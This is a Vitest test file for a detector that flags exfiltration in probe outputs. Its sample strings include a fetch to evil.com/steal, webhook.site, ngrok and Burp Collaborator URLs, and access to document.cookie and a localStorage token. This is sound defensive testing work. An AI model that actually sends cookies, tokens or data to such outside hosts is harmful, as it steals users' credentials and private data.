import { describe, it, expect } from 'vitest';
import { detectExfiltration } from './exfiltration.js';
import type { ProbeResult } from '@/types/verdict.js';

function makeResult(overrides: Partial<ProbeResult> = {}): ProbeResult {
  return {
    probeName: 'test',
    passed: true,
    flags: [],
    rawOutput: '',
    score: 0,
    errorMessage: null,
    ...overrides,
  };
}

describe('detectExfiltration', () => {
  it('returns false for clean output', () => {
    expect(
      detectExfiltration([makeResult({ rawOutput: 'This is a summary about cooking.' })]),
    ).toBe(false);
  });

  it('detects webhook URLs', () => {
    expect(
      detectExfiltration([
        makeResult({ rawOutput: 'Send data to https://webhook.site/abc123' }),
      ]),
    ).toBe(true);
  });

  it('detects ngrok URLs', () => {
    expect(
      detectExfiltration([
        makeResult({ rawOutput: 'Forward to https://abc.ngrok.io/receive' }),
      ]),
    ).toBe(true);
  });

  it('detects burp collaborator', () => {
    expect(
      detectExfiltration([
        makeResult({ rawOutput: 'Ping https://xyz.burpcollaborator.net' }),
      ]),
    ).toBe(true);
  });

  it('detects fetch() calls', () => {
    expect(
      detectExfiltration([makeResult({ rawOutput: 'fetch("https://evil.com/steal")' })]),
    ).toBe(true);
  });

  it('detects XMLHttpRequest', () => {
    expect(
      detectExfiltration([makeResult({ rawOutput: 'new XMLHttpRequest()' })]),
    ).toBe(true);
  });

  it('detects data exfiltration language', () => {
    expect(
      detectExfiltration([makeResult({ rawOutput: 'I will send the data to the server.' })]),
    ).toBe(true);
  });

  it('detects document.cookie access', () => {
    expect(
      detectExfiltration([makeResult({ rawOutput: 'Reading document.cookie for you.' })]),
    ).toBe(true);
  });

  it('detects localStorage access', () => {
    expect(
      detectExfiltration([
        makeResult({ rawOutput: 'localStorage.getItem("token") returns the value.' }),
      ]),
    ).toBe(true);
  });

  it('detects via flags (exfiltration_language)', () => {
    expect(detectExfiltration([makeResult({ flags: ['exfiltration_language'] })])).toBe(true);
  });

  it('detects via flags (credential_reference)', () => {
    expect(detectExfiltration([makeResult({ flags: ['credential_reference'] })])).toBe(true);
  });

  it('checks across multiple results', () => {
    expect(
      detectExfiltration([
        makeResult({ rawOutput: 'Clean output' }),
        makeResult({ rawOutput: 'Visit https://interact.sh/test for results.' }),
      ]),
    ).toBe(true);
  });
});
